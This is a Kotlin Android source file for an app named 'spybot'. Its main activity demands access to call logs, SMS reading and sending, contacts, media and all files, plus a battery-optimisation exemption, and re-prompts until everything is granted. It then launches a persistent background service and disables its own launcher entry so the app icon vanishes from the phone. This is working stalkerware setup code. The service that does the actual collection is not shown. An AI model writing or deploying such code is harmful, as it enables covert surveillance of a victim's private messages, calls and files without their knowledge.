package com.spybot.app

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private val PERMISSION_REQUEST_CODE = 100
    private val REQUIRED_PERMISSIONS = mutableListOf(
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.SEND_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.POST_NOTIFICATIONS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(android.Manifest.permission.READ_MEDIA_IMAGES)
            add(android.Manifest.permission.READ_MEDIA_VIDEO)
            add(android.Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = getSharedPreferences("spybot", MODE_PRIVATE)
        if (prefs.getBoolean("icon_hidden", false)) {
            startService()
            finish()
            return
        }

        if (allPermissionsGranted()) {
            startService()
            hideAppIcon()
            finish()
        } else {
            requestPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        val prefs = getSharedPreferences("spybot", MODE_PRIVATE)
        if (!prefs.getBoolean("icon_hidden", false) && allPermissionsGranted()) {
            startService()
            hideAppIcon()
            finish()
        }
    }

    private fun allPermissionsGranted(): Boolean {
        for (permission in REQUIRED_PERMISSIONS) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                return false
            }
        }
        return true
    }

    private fun requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (e: Exception) {}
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (allPermissionsGranted()) {
                startService()
                hideAppIcon()
                finish()
            } else {
                Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show()
                requestPermissions()
            }
        }
    }

    private fun startService() {
        try {
            val intent = Intent(this, MainService::class.java).apply {
                action = MainService.ACTION_START
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(this, intent)
            } else {
                startService(intent)
            }
            getSharedPreferences("spybot", MODE_PRIVATE)
                .edit()
                .putBoolean("service_enabled", true)
                .apply()
        } catch (e: Exception) {}
    }

    private fun hideAppIcon() {
        try {
            val prefs = getSharedPreferences("spybot", MODE_PRIVATE)
            if (prefs.getBoolean("icon_hidden", false)) return

            packageManager.setComponentEnabledSetting(
                ComponentName(this, "$packageName.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            prefs.edit().putBoolean("icon_hidden", true).apply()
        } catch (e: Exception) {}
    }
}
